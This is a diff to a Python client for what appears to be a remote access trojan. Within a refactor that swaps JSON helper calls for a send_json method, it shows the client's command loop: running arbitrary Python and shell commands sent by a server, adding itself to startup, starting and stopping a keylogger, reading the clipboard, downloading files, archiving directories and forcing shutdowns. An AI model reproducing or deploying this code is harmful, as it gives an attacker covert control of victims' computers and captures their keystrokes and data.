@@ -147,16 +147,6 @@ def kill(proc_pid: int) -> None:
     process.kill()
 
 
-def json_dumps(data: not bytes) -> bytes:
-    """ Dumps json data and encodes it """
-    return json.dumps(data).encode()
-
-
-def json_loads(data: bytes):
-    """ Decodes and then loads json data """
-    return json.loads(data.decode())
-
-
 def OnKeyboardEvent(event):
     logging.info(f"{event}")
 
@@ -225,6 +215,10 @@ class Client(object):
         self.socket.recv(1024)
         self.socket.send(encrypted)
 
+    def send_json(self, data: not bytes) -> None:
+        """ Send JSON data to Server """
+        self.send(json.dumps(data).encode())
+
     def check_perms(self, _file: str, mode: str) -> bool:
         try:
             with open(_file, mode):
@@ -270,7 +264,7 @@ class Client(object):
     def receive_commands(self) -> None:
         """ Receives Commands from Server """
         while True:
-            data = json_loads(self.receive())
+            data = json.loads(self.receive().decode())
             # data[0]: command
             # data[1]: data1
             # data[2]: data2
@@ -293,11 +287,11 @@ class Client(object):
                 continue
 
             if data[0] == '_INFO':
-                self.send(json_dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]))
+                self.send_json([platform.system(), os.path.expanduser('~'), getpass.getuser()])
                 continue
 
             if data[0] == 'FROZEN':
-                self.send(json_dumps(getattr(sys, 'frozen', False)))
+                self.send_json(getattr(sys, 'frozen', False))
                 continue
 
             if data[0] == 'EXEC':
@@ -310,48 +304,48 @@ class Client(object):
                     error = errors(e, line=False)
                 finally:
                     sys.stdout = old_stdout
-                self.send(json_dumps([redirected_output.getvalue(), error]))
+                self.send_json([redirected_output.getvalue(), error])
                 continue
 
             if data[0] == 'RESTART_SESSION':
-                self.send(json_dumps(True))
+                self.send_json(True)
                 break
 
             if data[0] == 'DISCONNECT':
-                self.send(json_dumps(True))
+                self.send_json(True)
                 self.socket.close()
                 sys.exit(0)
 
             if data[0] == 'ADD_STARTUP':
-                self.send(json_dumps(add_startup()))
+                self.send_json(add_startup())
                 continue
 
             if data[0] == 'REMOVE_STARTUP':
-                self.send(json_dumps(remove_startup()))
+                self.send_json(remove_startup())
                 continue
 
             if data[0] == 'LOCK':
                 if platform.system() == 'Windows':
-                    self.send(json_dumps(True))
+                    self.send_json(True)
                     ctypes.windll.user32.LockWorkStation()
                 else:
-                    self.send(json_dumps(False))
+                    self.send_json(False)
                 continue
 
             if data[0] == 'SHUTDOWN':
                 if platform.system() != 'Windows':
-                    self.send(json_dumps(False))
+                    self.send_json(False)
                     continue
-                self.send(json_dumps(True))
+                self.send_json(True)
                 subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
                 break
 
             if data[0] == 'RESTART':
                 if platform.system() != 'Windows':
-                    self.send(json_dumps(False))
+                    self.send_json(False)
                     continue
-                self.send(json_dumps(True))
+                self.send_json(True)
                 subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
                 break
@@ -370,9 +364,9 @@ class Client(object):
                     with ZipFile(data[1], 'w') as ziph:
                         ziph.write(data[2])
                 except Exception as e:
-                    self.send(json_dumps([False, errors(e)]))
+                    self.send_json([False, errors(e)])
                     continue
-                self.send(json_dumps([True, None]))
+                self.send_json([True, None])
                 continue
 
             if data[0] == 'ZIP_DIR':
@@ -380,9 +374,9 @@ class Client(object):
                 try:
                     shutil.make_archive(data[1], 'zip', data[2])
                 except Exception as e:
-                    self.send(json_dumps([False, errors(e)]))
+                    self.send_json([False, errors(e)])
                     continue
-                self.send(json_dumps([True, None]))
+                self.send_json([True, None])
                 continue
 
             if data[0] == 'UNZIP':
@@ -391,9 +385,9 @@ class Client(object):
                     with ZipFile(data[1], 'r') as ziph:
                         ziph.extractall()
                 except Exception as e:
-                    self.send(json_dumps([False, errors(e)]))
+                    self.send_json([False, errors(e)])
                     continue
-                self.send(json_dumps([True, None]))
+                self.send_json([True, None])
                 continue
 
             if data[0] == 'DOWNLOAD':
@@ -403,9 +397,9 @@ class Client(object):
                     with open(data[2], 'wb') as f:
                         f.write(r.content)
                 except Exception as e:
-                    self.send(json_dumps([False, errors(e, line=False)]))
+                    self.send_json([False, errors(e, line=False)])
                     continue
-                self.send(json_dumps([True, None]))
+                self.send_json([True, None])
                 continue
 
             if data[0] == 'INFO':
@@ -445,45 +439,45 @@ class Client(object):
 
             if data[0] == 'START_KEYLOGGER':
                 if not _pynput:
-                    self.send(json_dumps(False))
+                    self.send_json(False)
                     continue
                 if not KeyListener.running:
                     KeyListener.start()
                     logging.info('Started Keylogger')
-                self.send(json_dumps(True))
+                self.send_json(True)
                 continue
 
             if data[0] == 'KEYLOGGER_STATUS':
                 if not _pynput or not KeyListener.running:
-                    self.send(json_dumps(False))
+                    self.send_json(False)
                     continue
-                self.send(json_dumps(True))
+                self.send_json(True)
                 continue
 
             if data[0] == 'STOP_KEYLOGGER':
                 if not _pynput:
-                    self.send(json_dumps(False))
+                    self.send_json(False)
                     continue
                 if KeyListener.running:
                     logging.info('Stopped Keylogger')
                     KeyListener.stop()
                     threading.Thread.__init__(KeyListener) # re-initialise thread
-                self.send(json_dumps(True))
+                self.send_json(True)
                 continue
 
             if data[0] == 'COPY':
                 try:
                     pyperclip.copy(data[1])
-                    self.send(json_dumps([True, None]))
+                    self.send_json([True, None])
                 except Exception as e:
-                    self.send(json_dumps([False, errors(e)]))
+                    self.send_json([False, errors(e)])
                 continue
 
             if data[0] == 'PASTE':
                 try:
-                    self.send(json_dumps([True, pyperclip.paste()]))
+                    self.send_json([True, pyperclip.paste()])
                 except Exception as e:
-                    self.send(json_dumps([False, errors(e)]))
+                    self.send_json([False, errors(e)])
                 continue
 
             if data[0] == 'SHELL':
@@ -497,12 +491,12 @@ class Client(object):
                         # Command should only return one line (cwd)
                         if newlines > 1:
                             process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                            self.send(json_dumps(['ERROR', process.stdout.read().decode()]))
+                            self.send_json(['ERROR', process.stdout.read().decode()])
                             continue
                         os.chdir(output.strip())
-                        self.send(json_dumps([os.getcwd()]))
+                        self.send_json([os.getcwd()])
                         continue
-                    self.send(json_dumps(['ERROR', error]))
+                    self.send_json(['ERROR', error])
                     continue
 
                 process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
